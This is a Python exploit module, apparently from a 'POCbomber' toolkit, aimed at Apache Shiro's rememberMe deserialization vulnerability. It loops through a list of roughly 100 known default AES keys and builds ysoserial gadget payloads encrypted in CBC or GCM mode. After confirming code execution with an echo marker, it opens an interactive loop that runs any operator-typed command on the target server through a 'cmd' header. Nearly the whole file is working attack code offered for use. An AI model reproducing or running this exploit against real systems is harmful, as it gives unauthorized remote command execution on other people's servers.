import os
import time
import platform
import base64
import uuid
import re
import subprocess
import requests
from Crypto.Cipher import AES


def payload(target, key, ciphertype, assembly):
    # assembly = 'CommonsCollections2Echo'
    # assembly = 'CommonsBeanutils1Echo'
    ysoserial = os.path.join(os.path.abspath('.'), 'pocs', 'framework', 'shiro', 'ysoserial-0.0.6-SNAPSHOT-all.jar')
    popen = subprocess.Popen(['java', '-jar', ysoserial, assembly, 'echo'], stdout=subprocess.PIPE)
    file_body = popen.stdout.read()

    if ciphertype == 'GCM':
        base64_ciphertext = GCMCipher(key, file_body)
        try:
            header = {'cmd': 'echo POCbomber'}
            # print(len(base64_ciphertext.decode()))
            r = requests.get(target, headers=header, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=3, verify=False, stream=True, allow_redirects=False)
            # r.text
            if re.search('POCbomber', r.text):
                payload = "rememberMe=" + base64_ciphertext.decode()
                return payload
        except:
            return False

    if ciphertype == 'CBC':
        base64_ciphertext = CBCCipher(key, file_body)
        try:
            header = {'cmd': 'echo POCbomber'}
            r = requests.get(target, headers=header, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=3, verify=False, stream=True, allow_redirects=False)
            # r.text
            if re.search('POCbomber', r.text):
                payload = "rememberMe=" + base64_ciphertext.decode()
                return payload
        except:
            return False

            # 1.4.2及以上版本使用GCM加密


def GCMCipher(key, file_body):
    iv = os.urandom(16)
    cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)
    ciphertext, tag = cipher.encrypt_and_digest(file_body)
    ciphertext = ciphertext + tag
    base64_ciphertext = base64.b64encode(iv + ciphertext)
    return base64_ciphertext


def CBCCipher(key, file_body):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().bytes
    file_body = pad(file_body)
    encryptor = AES.new(base64.b64decode(key), mode, iv)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext


def verify(url):
    relsult = {
        'name': 'Shiro 反序列化漏洞',
        'vulnerable': False,
        'attack': True,
    }
    keys = [
        "kPH+bIxk5D2deZiIxcaaaA==",
        "4AvVhmFLUs0KTA3Kprsdag==",
        "Z3VucwAAAAAAAAAAAAAAAA==",
        "fCq+/xW488hMTCD+cmJ3aQ==",
        "0AvVhmFLUs0KTA3Kprsdag==",
        "1AvVhdsgUs0FSA3SDFAdag==",
        "1QWLxg+NYmxraMoxAXu/Iw==",
        "25BsmdYwjnfcWmnhAciDDg==",
        "2AvVhdsgUs0FSA3SDFAdag==",
        "3AvVhmFLUs0KTA3Kprsdag==",
        "3JvYhmBLUs0ETA5Kprsdag==",
        "r0e3c16IdVkouZgk1TKVMg==",
        "5aaC5qKm5oqA5pyvAAAAAA==",
        "5AvVhmFLUs0KTA3Kprsdag==",
        "6AvVhmFLUs0KTA3Kprsdag==",
        "6NfXkC7YVCV5DASIrEm1Rg==",
        "6ZmI6I2j5Y+R5aSn5ZOlAA==",
        "cmVtZW1iZXJNZQAAAAAAAA==",
        "7AvVhmFLUs0KTA3Kprsdag==",
        "8AvVhmFLUs0KTA3Kprsdag==",
        "8BvVhmFLUs0KTA3Kprsdag==",
        "9AvVhmFLUs0KTA3Kprsdag==",
        "OUHYQzxQ/W9e/UjiAGu6rg==",
        "a3dvbmcAAAAAAAAAAAAAAA==",
        "aU1pcmFjbGVpTWlyYWNsZQ==",
        "bWljcm9zAAAAAAAAAAAAAA==",
        "bWluZS1hc3NldC1rZXk6QQ==",
        "bXRvbnMAAAAAAAAAAAAAAA==",
        "ZUdsaGJuSmxibVI2ZHc9PQ==",
        "wGiHplamyXlVB11UXWol8g==",
        "U3ByaW5nQmxhZGUAAAAAAA==",
        "MTIzNDU2Nzg5MGFiY2RlZg==",
        "L7RioUULEFhRyxM7a2R/Yg==",
        "a2VlcE9uR29pbmdBbmRGaQ==",
        "WcfHGU25gNnTxTlmJMeSpw==",
        "OY//C4rhfwNxCQAQCrQQ1Q==",
        "5J7bIJIV0LQSN3c9LPitBQ==",
        "f/SY5TIve5WWzT4aQlABJA==",
        "bya2HkYo57u6fWh5theAWw==",
        "WuB+y2gcHRnY2Lg9+Aqmqg==",
        "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
        "3qDVdLawoIr1xFd6ietnwg==",
        "ZWvohmPdUsAWT3=KpPqda",
        "YI1+nBV//m7ELrIyDHm6DQ==",
        "6Zm+6I2j5Y+R5aS+5ZOlAA==",
        "2A2V+RFLUs+eTA3Kpr+dag==",
        "6ZmI6I2j3Y+R1aSn5BOlAA==",
        "SkZpbmFsQmxhZGUAAAAAAA==",
        "2cVtiE83c4lIrELJwKGJUw==",
        "fsHspZw/92PrS3XrPW+vxw==",
        "XTx6CKLo/SdSgub+OPHSrw==",
        "sHdIjUN6tzhl8xZMG3ULCQ==",
        "O4pdf+7e+mZe8NyxMTPJmQ==",
        "HWrBltGvEZc14h9VpMvZWw==",
        "rPNqM6uKFCyaL10AK51UkQ==",
        "Y1JxNSPXVwMkyvES/kJGeQ==",
        "lT2UvDUmQwewm6mMoiw4Ig==",
        "MPdCMZ9urzEA50JDlDYYDg==",
        "xVmmoltfpb8tTceuT5R7Bw==",
        "c+3hFGPjbgzGdrC+MHgoRQ==",
        "ClLk69oNcA3m+s0jIMIkpg==",
        "Bf7MfkNR0axGGptozrebag==",
        "1tC/xrDYs8ey+sa3emtiYw==",
        "ZmFsYWRvLnh5ei5zaGlybw==",
        "cGhyYWNrY3RmREUhfiMkZA==",
        "IduElDUpDDXE677ZkhhKnQ==",
        "yeAAo1E8BOeAYfBlm4NG9Q==",
        "cGljYXMAAAAAAAAAAAAAAA==",
        "2itfW92XazYRi5ltW0M2yA==",
        "XgGkgqGqYrix9lI6vxcrRw==",
        "ertVhmFLUs0KTA3Kprsdag==",
        "5AvVhmFLUS0ATA4Kprsdag==",
        "s0KTA3mFLUprK4AvVhsdag==",
        "hBlzKg78ajaZuTE0VLzDDg==",
        "9FvVhtFLUs0KnA3Kprsdyg==",
        "d2ViUmVtZW1iZXJNZUtleQ==",
        "yNeUgSzL/CfiWw1GALg6Ag==",
        "NGk/3cQ6F5/UNPRh8LpMIg==",
        "4BvVhmFLUs0KTA3Kprsdag==",
        "MzVeSkYyWTI2OFVLZjRzZg==",
        "CrownKey==a12d/dakdad",
        "empodDEyMwAAAAAAAAAAAA==",
        "A7UzJgh1+EWj5oBFi+mSgw==",
        "YTM0NZomIzI2OTsmIzM0NTueYQ==",
        "c2hpcm9fYmF0aXMzMgAAAA==",
        "i45FVt72K2kLgvFrJtoZRw==",
        "U3BAbW5nQmxhZGUAAAAAAA==",
        "ZnJlc2h6Y24xMjM0NTY3OA==",
        "Jt3C93kMR9D5e8QzwfsiMw==",
        "MTIzNDU2NzgxMjM0NTY3OA==",
        "vXP33AonIp9bFwGl7aT7rA==",
        "V2hhdCBUaGUgSGVsbAAAAA==",
        "Z3h6eWd4enklMjElMjElMjE=",
        "Q01TX0JGTFlLRVlfMjAxOQ==",
        "ZAvph3dsQs0FSL3SDFAdag==",
        "Is9zJ3pzNh2cgTHB4ua3+Q==",
        "NsZXjXVklWPZwOfkvk6kUA==",
        "GAevYnznvgNCURavBhCr1w==",
        "66v1O8keKNV3TTcGPK1wzg==",
        "SDKOLKn2J1j/2BHjeZwAoQ==",
    ]

    if check_shiro(url):
        for key in keys:
            for ciphertype in ['CBC', 'GCM']:
                for gadget in ['CommonsCollections2Echo', 'CommonsBeanutils1Echo']:
                    try:
                        shiro_deleteme = payload(url, key, ciphertype, gadget)
                        if shiro_deleteme:
                            relsult['vulnerable'] = True
                            relsult['url'] = url
                            relsult['ciphertype'] = ciphertype
                            relsult['gadget'] = gadget
                            relsult['key'] = key
                            relsult['about'] = 'https://github.com/feihong-cs/ShiroExploit'
                            return relsult
                    except:
                        continue
        return relsult
    else:
        return relsult

def check_shiro(url):
    header = {
        'cookie': 'rememberMe=1'
    }
    try:
        res = requests.get(url, verify=False, headers=header, allow_redirects=False, timeout=3)
        if 'rememberMe=deleteMe' in str(res.headers):
            return True
        else:
            return False
    except:
        return False


def attack(url):
    try:
        print('[+] 尝试自动获取Key值........')
        relsult = verify(url)
        if relsult['vulnerable']:
            print('[*] 目标: %s 存在shiro反序列化漏洞!'%url)
            key = relsult['key']
            gadget = relsult['gadget']
            ciphertype = relsult['ciphertype']
            print('[*] 检测到 Gadget: %s'%gadget)
            print('[*] 检测到 Ciphertype: %s'%ciphertype)
            print('[*] 检测到Shiro Key: %s'%key)
            ysoserial = os.path.join(os.path.abspath('.'), 'pocs', 'framework', 'shiro', 'ysoserial-0.0.6-SNAPSHOT-all.jar')
            popen = subprocess.Popen(['java', '-jar', ysoserial, gadget, 'echo'], stdout=subprocess.PIPE)
            file_body = popen.stdout.read()
            print('[+] 开始执行命令,输入exit退出!')
            cmd = ''
            while cmd != 'exit':
                cmd = input('[+] 执行命令:')
                if ciphertype == 'GCM':
                    base64_ciphertext = GCMCipher(key, file_body)
                    try:
                        header = {'cmd': cmd}
                        # print(len(base64_ciphertext.decode()))
                        r = requests.get(url, headers=header, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=3, verify=False, stream=True, allow_redirects=False)
                        print(r.text)
                    except:
                        pass

                if ciphertype == 'CBC':
                    base64_ciphertext = CBCCipher(key, file_body)
                    try:
                        header = {'cmd': cmd}
                        r = requests.get(url, headers=header, cookies={'rememberMe': base64_ciphertext.decode()}, timeout=3, verify=False, stream=True, allow_redirects=False)
                        print(r.text)

                    except:
                        pass

            return True
        else:
            return False
    except:
        return False



